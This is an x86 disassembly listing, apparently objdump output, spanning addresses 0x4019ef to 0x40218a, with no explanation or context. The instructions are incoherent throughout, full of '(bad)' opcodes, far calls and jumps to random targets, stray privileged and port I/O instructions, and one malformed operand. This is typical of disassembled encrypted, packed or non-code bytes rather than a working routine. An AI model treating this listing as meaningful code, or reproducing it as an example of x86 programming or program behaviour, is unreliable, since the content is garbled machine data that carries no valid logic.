  4019ef:	scas   al,BYTE PTR es:[edi]
  4019f0:	inc    esp
  4019f1:	jbe    0x4019d0
  4019f3:	sbb    DWORD PTR [esi-0x204cd6b],edi
  4019f9:	aaa    
  4019fa:	mov    bh,0xd8
  4019fc:	sbb    al,0x0
  4019fe:	xchg   esi,eax
  4019ff:	test   DWORD PTR [ebx-0x7837341d],esp
  401a05:	sub    al,0x36
  401a07:	fidiv  WORD PTR [eax-0x42d5a68a]
  401a0d:	(bad)  
  401a0e:	mov    bh,0x32
  401a10:	call   0x6d1:0x310f60a7
  401a17:	mov    esi,0x7e5b1db4
  401a1c:	mov    eax,0x9d37189e
  401a21:	arpl   WORD PTR [edi],dx
  401a23:	adc    eax,0x4ede3dd0
  401a28:	stos   BYTE PTR es:[edi],al
  401a29:	sub    al,0x41
  401a2b:	xchg   ebx,eax
  401a2c:	jnp    0x4019f5
  401a2e:	dec    edx
  401a2f:	inc    esp
  401a30:	std    
  401a31:	mov    esi,DWORD PTR [eax]
  401a33:	push   es
  401a34:	xlat   BYTE PTR ds:[ebx]
  401a35:	sbb    eax,0x5da9c3b1
  401a3a:	add    eax,0xa2ff7028
  401a3f:	lds    edx,FWORD PTR [ebx+edi*4]
  401a42:	mov    esp,edi
  401a44:	shr    DWORD PTR [ebx-0x3f],0xa6
  401a48:	and    WORD PTR [esi+0xa00ab4c],dx
  401a4f:	call   0xf03f:0x9deb59c4
  401a56:	xor    BYTE PTR [edi-0x68],al
  401a59:	inc    ebp
  401a5a:	sub    DWORD PTR [edx],edi
  401a5c:	test   al,0xb1
  401a5e:	(bad)  
  401a5f:	xor    ah,al
  401a61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401a62:	mov    ch,0xf
  401a64:	in     al,dx
  401a65:	xchg   esi,eax
  401a66:	sahf   
  401a67:	dec    ebp
  401a68:	xor    DWORD PTR ds:0x9743531d,edi
  401a6e:	retf   
  401a6f:	add    BYTE PTR [edx],dl
  401a71:	scas   al,BYTE PTR es:[edi]
  401a72:	mov    eax,ds:0x5110b937
  401a77:	cmp    cl,BYTE PTR [ebp+0x10]
  401a7a:	xor    DWORD PTR [esi-0x119d6644],ecx
  401a80:	sbb    DWORD PTR [edx+0x1afd2af4],ebx
  401a86:	repnz xchg ebx,eax
  401a88:	xchg   edi,eax
  401a89:	popa   
  401a8a:	sbb    bl,BYTE PTR cs:[esi+0x466f7bc4]
  401a91:	rcr    BYTE PTR [edi+0x646296c5],1
  401a97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401a98:	jne    0x401abe
  401a9a:	sub    al,0xad
  401a9c:	jbe    0x401abf
  401a9e:	cs cmc 
  401aa0:	iret   
  401aa1:	inc    ebp
  401aa2:	(bad)  
  401aa3:	(bad)  
  401aa4:	jmp    0xd01e09c9
  401aa9:	imul   edi,DWORD PTR [edx+edi*8+0x2c45b285],0xafe8c7ba
  401ab4:	or     DWORD PTR [esi],ecx
  401ab6:	pop    edx
  401ab7:	sbb    DWORD PTR [eax],ebx
  401ab9:	push   cs
  401aba:	mov    edx,0x922ac448
  401abf:	push   eax
  401ac0:	jno    0x401afa
  401ac2:	repnz pushf 
  401ac4:	sahf   
  401ac5:	adc    al,0x79
  401ac7:	or     al,0xd3
  401ac9:	les    ebx,FWORD PTR [edx-0x2369550d]
  401acf:	pop    edx
  401ad0:	jge    0x401b32
  401ad2:	rcr    DWORD PTR [esi-0x78fd7808],0xac
  401ad9:	mov    BYTE PTR [ebx+0x4c],dh
  401adc:	jmp    0xe9eb:0xbdc8426a
  401ae3:	je     0x401ac3
  401ae5:	or     ah,BYTE PTR [edi-0x61ee739]
  401aeb:	mov    dh,0xb5
  401aed:	arpl   bp,ax
  401aef:	adc    al,0x57
  401af1:	aam    0x9c
  401af3:	xchg   edx,eax
  401af4:	inc    esi
  401af5:	test   ebp,ebp
  401af7:	sbb    esp,DWORD PTR [esi+0xb]
  401afa:	(bad)  
  401afb:	fild   QWORD PTR [ebp+edi*1-0x37]
  401aff:	test   DWORD PTR [ebp+edi*8-0x720dd38b],edi
  401b06:	iret   
  401b07:	push   ds
  401b08:	js     0x401b69
  401b0a:	dec    ebp
  401b0b:	mov    edi,?
  401b0d:	adc    eax,0x667337a5
  401b12:	pop    ds
  401b13:	sbb    ebx,ebp
  401b15:	sub    eax,0xc90eda59
  401b1a:	call   0x9ba0:0x84d45c9f
  401b21:	cmc    
  401b22:	push   0xffffff93
  401b24:	dec    ecx
  401b25:	jnp    0x401b4d
  401b27:	or     BYTE PTR [esi-0x79],al
  401b2a:	mov    gs,WORD PTR [edx]
  401b2c:	mov    WORD PTR [esi+0x7c],ss
  401b2f:	push   esi
  401b30:	call   0xeaaab8cf
  401b35:	clc    
  401b36:	xchg   ecx,eax
  401b37:	jge    0x401af0
  401b39:	add    al,BYTE PTR [ebx]
  401b3b:	inc    edi
  401b3c:	adc    al,0x1a
  401b3e:	inc    edi
  401b3f:	(bad)  [esi]
  401b41:	push   esp
  401b42:	sub    eax,0xb1a6942
  401b47:	sub    BYTE PTR [edi-0x7],dh
  401b4a:	mov    eax,ds:0x4bb596af
  401b4f:	test   BYTE PTR [ebx-0x129d870f],0x12
  401b56:	ja     0x401b2f
  401b58:	lds    ecx,FWORD PTR [eax+edx*2+0x4d]
  401b5c:	mov    ch,0xcc
  401b5e:	jo     0x401bdd
  401b60:	push   cs
  401b61:	not    DWORD PTR [edx+0x5e]
  401b64:	mov    ds:0xd11553c4,al
  401b69:	cmp    esi,DWORD PTR [ebx+0x5b]
  401b6c:	bound  edi,QWORD PTR [ebp+ebx*2+0x74]
  401b70:	pop    ss
  401b71:	fimul  DWORD PTR [ebp+0x47]
  401b74:	(bad)  
  401b75:	and    eax,0x10dcc98f
  401b7a:	nop
  401b7b:	mov    bh,0xdb
  401b7d:	push   ebp
  401b7e:	(bad)  
  401b80:	dec    esi
  401b81:	dec    esi
  401b82:	bound  esi,QWORD PTR ds:0xc577c11f
  401b88:	add    edi,ecx
  401b8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401b8b:	or     ch,BYTE PTR [ebx+eax*1]
  401b8e:	inc    edx
  401b8f:	pop    ebp
  401b90:	cmp    al,BYTE PTR [ecx]
  401b92:	xchg   esi,eax
  401b93:	ret    
  401b94:	std    
  401b95:	xchg   ecx,eax
  401b96:	add    al,0x5b
  401b98:	cmc    
  401b99:	les    ebx,FWORD PTR [ecx+0x6b37a4e]
  401b9f:	bound  ebx,QWORD PTR [edx+edi*4-0x4e7a375d]
  401ba6:	jmp    0x5f02:0x1e147da7
  401bad:	data16 test BYTE PTR [edi+0x2a63f6b3],dl
  401bb4:	lods   eax,DWORD PTR ds:[esi]
  401bb5:	xchg   esp,eax
  401bb6:	mov    ch,0x5f
  401bb8:	pop    ebx
  401bb9:	dec    esi
  401bba:	sub    al,0xb4
  401bbc:	in     al,dx
  401bbd:	ja     0x401b59
  401bbf:	(bad)  
  401bc0:	jge    0x401b84
  401bc2:	pop    eax
  401bc3:	int3   
  401bc4:	dec    ecx
  401bc5:	jle    0x401c2a
  401bc7:	dec    edx
  401bc8:	xor    BYTE PTR [edx+eiz*4],cl
  401bcb:	push   cs
  401bcc:	std    
  401bcd:	and    eax,0x8715196e
  401bd2:	bound  edx,QWORD PTR [edx]
  401bd4:	(bad)  
  401bd5:	push   ebp
  401bd6:	ins    DWORD PTR es:[edi],dx
  401bd7:	test   al,0xf6
  401bd9:	xor    edi,DWORD PTR [edx+ebp*2+0x6e]
  401bdd:	in     al,0xf6
  401bdf:	jne    0x401c22
  401be1:	(bad)  
  401be2:	adc    al,BYTE PTR [edx-0x40312908]
  401be8:	std    
  401be9:	sbb    eax,0x3760f196
  401bee:	add    DWORD PTR [ebx],edi
  401bf0:	or     cl,BYTE PTR [ecx+0x6d]
  401bf3:	out    0x77,al
  401bf5:	js     0x401bb9
  401bf7:	jmp    0x401c43
  401bf9:	push   edi
  401bfa:	scas   eax,DWORD PTR es:[edi]
  401bfb:	and    BYTE PTR ds:0x5649a85c,ah
  401c01:	cmc    
  401c02:	xor    DWORD PTR ss:[ecx+0x1d],0x4e
  401c07:	ds (bad) 
  401c09:	sbb    BYTE PTR [edi-0x41632d13],ah
  401c0f:	loopne 0x401c03
  401c11:	sub    BYTE PTR [ecx+0x2a],dh
  401c14:	shr    DWORD PTR [edx-0x7f],1
  401c17:	mov    edi,0x7fa9bd4e
  401c1c:	push   edi
  401c1d:	add    BYTE PTR [esi-0x5351073b],dh
  401c23:	fwait
  401c24:	mov    ch,0x8c
  401c26:	mov    esp,0xa85da985
  401c2b:	add    eax,0xd0ab5add
  401c30:	mov    bl,0x41
  401c32:	xchg   ebp,eax
  401c33:	mov    ecx,0x2556df38
  401c38:	sbb    cl,BYTE PTR [ebx]
  401c3a:	mov    dh,0x82
  401c3c:	ins    BYTE PTR es:[edi],dx
  401c3d:	fmul   DWORD PTR [ebx]
  401c3f:	fs in  al,0x3a
  401c42:	stc    
  401c43:	(bad)  
  401c44:	ror    DWORD PTR [edi-0x56],1
  401c47:	or     al,0x18
  401c49:	imul   esi,DWORD PTR [eax+edi*2-0x3f],0x225a1b9d
  401c51:	adc    BYTE PTR [edi],ah
  401c53:	sbb    esi,edx
  401c55:	je     0x401be4
  401c57:	inc    ecx
  401c58:	adc    eax,0x3b4d097b
  401c5d:	xchg   ebp,eax
  401c5e:	mov    dh,0x6a
  401c60:	cmc    
  401c61:	adc    eax,0x67cc777
  401c66:	pop    ecx
  401c67:	shl    DWORD PTR [edi-0x11],0x8e
  401c6b:	imul   edi,DWORD PTR [eax-0x37341375],0x20dfdff8
  401c75:	out    0x2e,eax
  401c77:	dec    esi
  401c78:	int    0x65
  401c7a:	rcl    al,cl
  401c7c:	mov    esi,0x9338c5fb
  401c81:	dec    ebx
  401c82:	jbe    0x401c92
  401c84:	cmp    BYTE PTR [edx-0x28],0xcb
  401c88:	inc    ebx
  401c89:	dec    ebx
  401c8a:	sub    eax,0xbde65d1d
  401c8f:	push   eax
  401c90:	cli    
  401c91:	test   eax,0xd0f3fd98
  401c96:	push   ebx
  401c97:	jl     0x401cd3
  401c99:	sub    DWORD PTR [edx+0x67af0f19],eax
  401c9f:	jne    0x401cd1
  401ca1:	clc    
  401ca2:	ds (bad) 
  401ca4:	pusha  
  401ca5:	push   esp
  401ca6:	xchg   edi,eax
  401ca7:	sti    
  401ca8:	mov    edi,0x42c48221
  401cad:	push   ds
  401cae:	test   al,0x16
  401cb0:	inc    DWORD PTR [ebx]
  401cb2:	test   BYTE PTR [edi],0xf9
  401cb5:	mov    ch,0x6b
  401cb7:	push   ebx
  401cb8:	jmp    0xe9a5:0xc45f2c4e
  401cbf:	sar    DWORD PTR [eax],cl
  401cc1:	xchg   edx,eax
  401cc2:	and    DWORD PTR [ecx],ebp
  401cc4:	mov    eax,0x7acae0bb
  401cc9:	jle    0x401cd7
  401ccb:	mov    ds:0x36e1da0c,eax
  401cd0:	ins    DWORD PTR es:[edi],dx
  401cd1:	add    BYTE PTR [ebx-0x3273aaa1],0x84
  401cd8:	mov    ah,0x2a
  401cda:	dec    esp
  401cdb:	xchg   edx,eax
  401cdc:	ja     0x401cea
  401cde:	daa    
  401cdf:	fcomp  DWORD PTR [esi+esi*4]
  401ce2:	pop    es
  401ce3:	test   BYTE PTR [edx-0x490951d7],ah
  401ce9:	and    ah,BYTE PTR [ebx+0x63]
  401cec:	call   0x842e:0xa977eba9
  401cf3:	jge    0x401d1e
  401cf5:	pop    ecx
  401cf6:	mov    esi,0x6f4814f5
  401cfb:	or     eax,edx
  401cfd:	cmp    al,0x6c
  401cff:	gs cmc 
  401d01:	push   ecx
  401d02:	add    eax,eax
  401d04:	ins    DWORD PTR es:[edi],dx
  401d05:	pop    ebp
  401d06:	stos   DWORD PTR es:[edi],eax
  401d07:	adc    eax,edi
  401d09:	mov    edx,0x50266d12
  401d0e:	ret    0x8859
  401d11:	push   0x325bf771
  401d16:	mov    esi,DWORD PTR [ecx+0x72]
  401d19:	das    
  401d1a:	sub    al,0xd1
  401d1c:	cmp    eax,0x63e0dd81
  401d21:	pop    ebx
  401d22:	ja     0x401d88
  401d24:	xchg   edi,eax
  401d25:	dec    esp
  401d26:	iret   
  401d27:	sub    eax,0xdd2e45a1
  401d2c:	xchg   edi,eax
  401d2d:	dec    eax
  401d2e:	(bad)  
  401d2f:	(bad)  
  401d30:	adc    al,0x1b
  401d32:	ins    BYTE PTR es:[edi],dx
  401d33:	jmp    0xb740e9fc
  401d38:	ins    DWORD PTR es:[edi],dx
  401d39:	out    0x77,al
  401d3b:	ins    BYTE PTR es:[edi],dx
  401d3c:	cmp    BYTE PTR [eax-0x50],cl
  401d3f:	sar    dh,0xb9
  401d42:	test   al,0x15
  401d44:	fdivr  st(5),st
  401d46:	push   ebx
  401d47:	ins    DWORD PTR es:[edi],dx
  401d48:	fldenv [ecx+ebp*2+0x38d06336]
  401d4f:	arpl   dx,dx
  401d51:	jg     0x401cdc
  401d53:	loope  0x401dd3
  401d55:	dec    esp
  401d56:	stos   DWORD PTR es:[edi],eax
  401d57:	(bad)  
  401d59:	in     eax,0x47
  401d5b:	enter  0x591e,0x18
  401d5f:	scas   eax,DWORD PTR es:[edi]
  401d60:	dec    edx
  401d61:	and    esp,0x50
  401d64:	repz sbb edx,esp
  401d67:	in     al,0x86
  401d69:	xor    cl,BYTE PTR [ebx]
  401d6b:	leave  
  401d6c:	pop    ds
  401d6d:	int3   
  401d6e:	dec    ebp
  401d6f:	or     ecx,0x55
  401d72:	mov    ecx,0xc0759d29
  401d77:	or     cl,BYTE PTR [ebp+0x94fcf98]
  401d7d:	clc    
  401d7e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401d7f:	iret   
  401d80:	pop    ecx
  401d81:	push   cs
  401d82:	inc    edi
  401d83:	push   cs
  401d84:	int    0x3d
  401d86:	cwde   
  401d87:	and    bh,al
  401d89:	inc    edi
  401d8a:	pop    es
  401d8b:	icebp  
  401d8c:	bound  ecx,QWORD PTR [ebx]
  401d8e:	fnstsw WORD PTR [esp+esi*1-0x71]
  401d92:	or     DWORD PTR [eax+0x12],esp
  401d95:	mov    edi,0x2ca0f1c0
  401d9a:	pushf  
  401d9b:	dec    ebx
  401d9c:	lea    ebx,[ebp+edx*4-0x74c8552a]
  401da3:	lock arpl WORD PTR [edx-0xd3bb592],ax
  401daa:	adc    al,0x60
  401dac:	arpl   WORD PTR [edi-0x14e6c79b],si
  401db2:	sub    BYTE PTR [ebx+ebp*2],ch
  401db5:	in     al,dx
  401db6:	pop    ebp
  401db7:	fadd   DWORD PTR [ecx-0x5b53175d]
  401dbd:	dec    edi
  401dbe:	push   esp
  401dbf:	sbb    eax,0x2de25458
  401dc4:	neg    DWORD PTR [esi+0x1d]
  401dc7:	pop    eax
  401dc8:	mov    ebx,0x49bb81ae
  401dcd:	js     0x401e22
  401dcf:	mov    dh,0xef
  401dd1:	(bad)  
  401dd3:	imul   BYTE PTR [ebp+0x3f]
  401dd6:	cs or  eax,0x72a34105
  401ddc:	pop    ebx
  401ddd:	xchg   edi,eax
  401dde:	and    esi,DWORD PTR [esi-0x2b]
  401de1:	sbb    eax,0xcc6a5d8f
  401de6:	ret    0xffee
  401de9:	xchg   ecx,eax
  401dea:	xchg   esp,eax
  401deb:	add    eax,0x90cd07f0
  401df0:	dec    ebx
  401df1:	mov    eax,ds:0xf92bd5ce
  401df6:	mov    edi,0x9556c33a
  401dfb:	sub    esi,DWORD PTR [ecx]
  401dfd:	inc    esp
  401dfe:	inc    edx
  401e00:	or     dl,BYTE PTR [esi-0x65a41523]
  401e06:	loop   0x401e0b
  401e08:	lods   eax,DWORD PTR ds:[esi]
  401e09:	fist   DWORD PTR [ebx-0x50]
  401e0c:	xchg   esp,eax
  401e0d:	and    DWORD PTR [edi+0x36],edi
  401e10:	fsub   DWORD PTR ds:0x16b917f7
  401e16:	sub    eax,DWORD PTR ds:0x4cf99d30
  401e1c:	add    BYTE PTR [edi+0x2b7be46a],cl
  401e22:	xor    al,BYTE PTR [edi+esi*8-0x337af517]
  401e29:	ins    DWORD PTR es:[edi],dx
  401e2a:	jl     0x401e76
  401e2c:	cdq    
  401e2d:	pop    ecx
  401e2e:	in     eax,0xc6
  401e30:	prefetch BYTE PTR [ecx]
  401e33:	mov    BYTE PTR [ebp-0x1b371374],ch
  401e39:	jecxz  0x401dd8
  401e3b:	xchg   edi,eax
  401e3c:	pushfw 
  401e3e:	loope  0x401dce
  401e40:	dec    ecx
  401e41:	aad    0x32
  401e43:	rcr    BYTE PTR [esp+ebx*1-0x17],0xd
  401e48:	jo     0x401e89
  401e4a:	mov    WORD PTR [esi+0x52],fs
  401e4d:	jp     0x401e44
  401e4f:	outs   dx,DWORD PTR ds:[esi]
  401e50:	add    al,0x8e
  401e52:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401e53:	pop    ecx
  401e54:	mov    edx,0x94e8f910
  401e59:	in     eax,0x4
  401e5b:	jle    0x401e3f
  401e5d:	lods   al,BYTE PTR ds:[esi]
  401e5e:	fld    DWORD PTR [edx+0x51dec119]
  401e64:	mov    ah,0x7f
  401e66:	shr    edi,cl
  401e68:	fcmovbe st,st(2)
  401e6a:	cdq    
  401e6b:	ds jne 0x401ee2
  401e6e:	add    BYTE PTR [ecx-0x409cd9d5],0xc5
  401e75:	out    dx,al
  401e76:	std    
  401e77:	sbb    bh,ch
  401e79:	xchg   ecx,eax
  401e7a:	mov    edx,cr2
  401e7d:	pop    es
  401e7e:	call   0xedfb0520
  401e83:	arpl   WORD PTR [edi+0x3ea6c1f1],sp
  401e89:	mov    ch,0x5a
  401e8b:	push   ebx
  401e8c:	in     al,0xc4
  401e8e:	std    
  401e8f:	out    dx,al
  401e90:	lahf   
  401e91:	stos   DWORD PTR es:[edi],eax
  401e92:	daa    
  401e93:	or     BYTE PTR [ebx+0x6e],ch
  401e96:	enter  0x17dc,0xda
  401e9a:	pop    esp
  401e9b:	popf   
  401e9c:	int3   
  401e9d:	sub    ah,BYTE PTR [edi-0xd]
  401ea0:	in     eax,dx
  401ea1:	popa   
  401ea2:	adc    bh,BYTE PTR [eax+0x7a86d419]
  401ea8:	stos   BYTE PTR es:[edi],al
  401ea9:	jne    0x401e67
  401eab:	xor    BYTE PTR [ebp+0x2c],dl
  401eae:	test   eax,0x1dd8c9c0
  401eb3:	les    ecx,FWORD PTR [ebx-0x62]
  401eb6:	scas   al,BYTE PTR es:[edi]
  401eb7:	push   esi
  401eb8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401eb9:	call   0xec20e7b0
  401ebe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401ebf:	fstp   TBYTE PTR [eax+0x7a]
  401ec2:	push   ebx
  401ec3:	retf   
  401ec4:	call   DWORD PTR [ecx]
  401ec6:	clc    
  401ec7:	jg     0x401ed5
  401ec9:	add    BYTE PTR [edx+edi*8+0x76257d08],dh
  401ed0:	push   0x5f95646b
  401ed5:	sti    
  401ed6:	(bad)  
  401ed8:	push   esp
  401ed9:	adc    DWORD PTR ds:0x14e59e77,ecx
  401edf:	pop    eax
  401ee0:	and    dl,BYTE PTR [eax+0x32acae3c]
  401ee6:	hlt    
  401ee7:	inc    edx
  401ee8:	jecxz  0x401f1b
  401eea:	in     eax,0xf2
  401eec:	dec    esi
  401eed:	adc    eax,0xb0950f7a
  401ef2:	inc    eax
  401ef3:	retf   
  401ef4:	(bad)  
  401ef5:	sbb    esp,DWORD PTR [ebx]
  401ef7:	out    0x71,al
  401ef9:	popa   
  401efa:	or     al,0x90
  401efc:	xor    eax,0x9d2551d
  401f01:	cmc    
  401f02:	ret    
  401f03:	int3   
  401f04:	xor    al,0xa7
  401f06:	(bad)  
  401f07:	fiadd  WORD PTR [edx-0x6d34b8cb]
  401f0d:	xchg   ebp,eax
  401f0e:	inc    edi
  401f0f:	mov    al,0xf8
  401f11:	or     BYTE PTR [edx],ah
  401f13:	dec    eax
  401f14:	dec    ebx
  401f15:	cmp    al,0x8e
  401f17:	int    0x59
  401f19:	dec    ebp
  401f1a:	ja     0x401f87
  401f1c:	mov    cl,0x24
  401f1e:	fwait
  401f1f:	jmp    0x401ee4
  401f21:	ins    BYTE PTR es:[edi],dx
  401f22:	cmp    eax,DWORD PTR [edx+0x27a0cb86]
  401f28:	or     edi,ecx
  401f2a:	rcl    BYTE PTR [edi+0x6e],0xfc
  401f2e:	cdq    
  401f2f:	or     DWORD PTR [esi-0x45],ebx
  401f32:	pop    ss
  401f33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401f34:	dec    esi
  401f35:	jno    0x401f09
  401f37:	je     0x401ebd
  401f39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401f3a:	(bad)  
  401f3b:	stc    
  401f3c:	stos   BYTE PTR es:[edi],al
  401f3d:	cld    
  401f3e:	jmp    0x401f06
  401f40:	out    dx,eax
  401f41:	adc    eax,0x3a6e1213
  401f46:	mov    ch,0xe0
  401f48:	pop    ebx
  401f49:	or     al,0x24
  401f4b:	call   0x3e2f:0xece2a146
  401f52:	push   edi
  401f53:	cmp    dl,ah
  401f55:	mov    al,0x54
  401f57:	scas   eax,DWORD PTR es:[edi]
  401f58:	lods   al,BYTE PTR ds:[esi]
  401f59:	sub    DWORD PTR [eax+0x42068c4],ebx
  401f5f:	adc    bl,BYTE PTR es:[ecx]
  401f62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401f63:	mov    eax,ds:0xa51a204e
  401f68:	pop    ecx
  401f69:	mov    ebx,0xefa3e2bf
  401f6e:	or     al,0x23
  401f70:	iret   
  401f71:	rcl    BYTE PTR [ecx+edx*1-0x4fa4b608],cl
  401f78:	aad    0x52
  401f7a:	or     al,0x90
  401f7c:	jae    0x401fd6
  401f7e:	and    ebp,DWORD PTR [ebp+0x3843a587]
  401f84:	data16 sub BYTE PTR [esi+ebp*2],ah
  401f88:	cmp    BYTE PTR [ecx+0x5289005e],ch
  401f8e:	ss retf 0xcd8f
  401f92:	cmp    DWORD PTR [edx-0x2b268c22],esp
  401f98:	push   0xffffffdd
  401f9a:	lods   eax,DWORD PTR ds:[esi]
  401f9b:	inc    esp
  401f9c:	add    esp,DWORD PTR [eax-0x4addbfa3]
  401fa2:	jecxz  0x401faf
  401fa4:	in     al,dx
  401fa5:	pushf  
  401fa6:	fadd   st(1),st
  401fa8:	lods   eax,DWORD PTR ds:[esi]
  401fa9:	das    
  401faa:	cmp    eax,0x512de64e
  401faf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401fb0:	out    dx,eax
  401fb1:	iret   
  401fb2:	push   0x2e
  401fb4:	mov    al,0x62
  401fb6:	push   esp
  401fb7:	push   ds
  401fb8:	out    dx,eax
  401fb9:	into   
  401fba:	in     al,0xb4
  401fbc:	jecxz  0x401f41
  401fbe:	loope  0x401f50
  401fc0:	sbb    BYTE PTR [ebx+ebx*4+0x7],dl
  401fc4:	push   edi
  401fc5:	outs   dx,BYTE PTR ds:[esi]
  401fc6:	and    ebp,esi
  401fc8:	in     eax,dx
  401fc9:	inc    edx
  401fca:	retf   
  401fcb:	add    ah,BYTE PTR [ebp+0x8e66f4f]
  401fd1:	pxor   mm7,mm3
  401fd4:	sahf   
  401fd5:	jg     0x401ff2
  401fd7:	jno    0x401fcb
  401fd9:	mov    eax,0xcba9461f
  401fde:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401fdf:	int3   
  401fe0:	loope  0x401fdb
  401fe2:	xor    ah,BYTE PTR [edi]
  401fe4:	xchg   esp,eax
  401fe5:	pop    esp
  401fe6:	xchg   ecx,eax
  401fe7:	add    bl,BYTE PTR [edi-0x50]
  401fea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401feb:	jge    0x40204c
  401fed:	jmp    0x5c8f8f13
  401ff2:	frstor [eax-0x77]
  401ff5:	rcr    BYTE PTR [edi],cl
  401ff7:	xor    al,BYTE PTR [ecx+ecx*8]
  401ffa:	lods   al,BYTE PTR ds:[esi]
  401ffb:	(bad)  
  401ffc:	or     eax,0xacfc0629
  402001:	mov    esi,0x41287341
  402006:	scas   al,BYTE PTR es:[edi]
  402007:	stos   DWORD PTR es:[edi],eax
  402008:	fild   WORD PTR es:[ecx]
  40200b:	xchg   DWORD PTR [ebx-0x12970e19],eax
  402011:	retf   
  402012:	jmp    0x40202a
  402014:	inc    eax
  402015:	(bad)  
  402016:	(bad)  
  402017:	cmp    ch,BYTE PTR [esi-0x7efcec06]
  40201d:	sbb    ah,BYTE PTR [eax]
  40201f:	add    DWORD PTR [ecx],eax
  402021:	shl    BYTE PTR [ebx-0x1309720f],0xa7
  402028:	cdq    
  402029:	push   ebp
  40202a:	sub    ecx,DWORD PTR [edi]
  40202c:	stos   BYTE PTR es:[edi],al
  40202d:	cmp    esi,DWORD PTR [edi]
  40202f:	and    BYTE PTR [esi],bh
  402031:	mov    esp,0xd75d3af6
  402036:	xor    eax,0x762ca37d
  40203b:	retf   
  40203c:	jp     0x402033
  40203e:	mov    ecx,DWORD PTR [eax+esi*2-0x49]
  402042:	xlat   BYTE PTR ds:[ebx]
  402043:	shl    DWORD PTR [esi+eiz*1],0xe6
  402047:	xor    DWORD PTR [ebx+0x35c255e7],eax
  40204d:	call   0x4f979115
  402052:	dec    ebx
  402053:	lea    eax,[edi+esi*4-0x7b]
  402057:	push   ebp
  402058:	push   esp
  402059:	cld    
  40205a:	call   0xf4004255
  40205f:	or     eax,0x4a39d578
  402064:	lods   eax,DWORD PTR ds:[esi]
  402065:	pusha  
  402066:	int    0xcb
  402068:	adc    ecx,DWORD PTR [ebx+ecx*4]
  40206b:	push   es
  40206c:	lods   al,BYTE PTR ds:[esi]
  40206d:	mov    ebp,0x22d82a8b
  402072:	mov    ah,0x30
  402074:	aas    
  402075:	cmp    esi,esp
  402077:	ror    DWORD PTR [eax],1
  402079:	ja     0x402058
  40207b:	xchg   ecx,eax
  40207c:	sub    BYTE PTR [eax],ah
  40207e:	ja     0x40204f
  402080:	test   bh,0xe9
  402083:	mov    esp,0x82e8a5b3
  402088:	inc    eax
  402089:	cmp    edi,DWORD PTR [ebx]
  40208b:	xor    dh,al
  40208d:	retf   0x7049
  402090:	add    ah,BYTE PTR [ebx+0x7ee7c758]
  402096:	stos   BYTE PTR es:[edi],al
  402097:	out    dx,al
  402098:	xor    dl,BYTE PTR [edx-0x1356e70b]
  40209e:	fisubr DWORD PTR [ebx+eax*1]
  4020a1:	shr    DWORD PTR [edx-0x1fbe5817],0xde
  4020a8:	setns  BYTE PTR [ebx]
  4020ab:	fs sub al,0x76
  4020ae:	pop    ds
  4020af:	mov    ecx,0x2ab25775
  4020b4:	in     al,0xf5
  4020b6:	push   edi
  4020b7:	jmp    0xe153b490
  4020bc:	lahf   
  4020bd:	ror    DWORD PTR [eax],0xfc
  4020c0:	or     ebx,DWORD PTR ds:0x644c0718
  4020c6:	popa   
  4020c7:	into   
  4020c8:	add    DWORD PTR [ebx+0x19d42800],0xdd24b52c
  4020d2:	imul   BYTE PTR [ecx-0x24]
  4020d5:	scas   al,BYTE PTR es:[edi]
  4020d6:	add    eax,0x214cb440
  4020db:	pop    esi
  4020dc:	pop    eax
  4020dd:	fwait
  4020de:	dec    edx
  4020df:	adc    BYTE PTR [edx+edi*4+0x43],dh
  4020e3:	loop   0x4020e0
  4020e5:	push   es
  4020e6:	and    al,0x58
  4020e8:	cmp    DWORD PTR [esi+0x2be7610d],esi
  4020ee:	arpl   WORD PTR [ebx-0x2af83d6],bp
  4020f4:	nop
  4020f5:	lods   eax,DWORD PTR ds:[esi]
  4020f6:	loope  0x402160
  4020f8:	and    eax,0xe7a6521b
  4020fd:	je     0x40210c
  4020ff:	in     al,0xe7
  402101:	fwait
  402102:	and    dh,dh
  402104:	jg     0x402172
  402106:	fdivr  st,st(2)
  402108:	loop   0x402157
  40210a:	jae    0x40210a
  40210c:	mov    dl,0xe4
  40210e:	pop    esp
  40210f:	(bad)  
  402110:	clc    
  402111:	push   ds
  402112:	xor    al,0xf5
  402114:	mov    dh,0x21
  402116:	imul   edx,DWORD PTR [ebx],0xd7ed3c88
  40211c:	push   ss
  40211d:	repz icebp 
  40211f:	pop    esi
  402120:	or     DWORD PTR [eax+0xf99274f],ecx
  402126:	pop    es
  402127:	sbb    ah,dl
  402129:	jbe    0x40212e
  40212b:	add    edi,DWORD PTR [ebx-0x1e2dadb2]
  402131:	call   0xf9b:0xd849ccfc
  402138:	pop    esp
  402139:	mov    edx,0x2b2a557b
  40213e:	adc    DWORD PTR [esi+esi*1-0x3f1a662],ebp
  402145:	cwde   
  402146:	lods   al,BYTE PTR ds:[esi]
  402147:	addr16 (bad) 
  402149:	pop    ebp
  40214a:	adc    dl,dl
  40214c:	pop    eax
  40214d:	inc    esi
  40214e:	rcl    DWORD PTR ds:0x31b7bece,1
  402154:	mov    ah,0xee
  402156:	lds    edx,FWORD PTR [ebx-0x11364c8b]
  40215c:	cmp    al,0xc
  40215e:	dec    eax
  40215f:	lahf   
  402160:	fcmovnu st,st(3)
  402162:	sbb    ch,BYTE PTR [edi-0x14]
  402165:	sub    cl,BYTE PTR [edx-0x32eb5deb]
  40216b:	fadd   QWORD PTR [ecx+0x17140f45]
  402171:	shl    BYTE PTR [ebx+0x3d8e6c6a],cl
  402177:	leave  
  402178:	das    
  402179:	ret    
  40217a:	xchg   edi,eax
  40217b:	adc    dl,BYTE PTR [ecx-0x63]
  40217e:	jns    0x4021bd
  402180:	xor    esi,ebp
  402182:	dec    edi
  402183:	call   0xa868:0xf2dad774
  40218a:	xor    dl,BYTE PTR [eax]
